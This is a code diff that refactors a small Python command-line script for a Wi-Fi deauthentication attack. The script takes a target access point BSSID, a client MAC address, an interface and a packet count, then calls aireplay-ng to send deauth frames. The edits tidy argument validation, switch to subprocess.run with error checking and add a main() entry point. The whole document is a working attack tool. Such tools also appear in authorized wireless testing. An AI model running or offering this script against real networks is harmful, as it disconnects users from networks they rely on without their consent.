@@ -11,14 +11,8 @@ def get_input():
     parser.add_argument("-c", "--client_mac", help="specify client MAC address")
     args = parser.parse_args()
 
-    if not args.client_bssid:
-        parser.error("[-] Please specify Wi-Fi BSSID. Use --help for more information.")
-    elif not args.interface:
-        parser.error("[-] Please specify interface. Use --help for more information.")
-    elif not args.deauth_pack:
-        parser.error("[-] Please specify the number of deauth packets. Use --help for more information.")
-    elif not args.client_mac:
-        parser.error("[-] Please specify the client MAC address. Use --help for more information.")
+    if not all([args.client_bssid, args.interface, args.deauth_pack, args.client_mac]):
+        parser.error("[-] Please provide all the required arguments. Use --help for more information.")
 
     return args
 
@@ -26,8 +20,14 @@ def get_input():
 def deauth_attack(client_bssid, deauth_pack, client_mac, interface):
     '''Deauth attack function'''
     print(f'Deauth attack against {client_bssid} on {client_mac} using {interface}')
-    subprocess.call(['aireplay-ng', '--deauth', str(deauth_pack), '-a', client_bssid, '-c', client_mac, interface])
+    subprocess.run(['aireplay-ng', '--deauth', str(deauth_pack), '-a', client_bssid, '-c', client_mac, interface],
+                   check=True)
 
 
-options = get_input()
-deauth_attack(options.client_bssid, options.deauth_pack, options.client_mac, options.interface)
+def main():
+    options = get_input()
+    deauth_attack(options.client_bssid, options.deauth_pack, options.client_mac, options.interface)
+
+
+if __name__ == "__main__":
+    main()
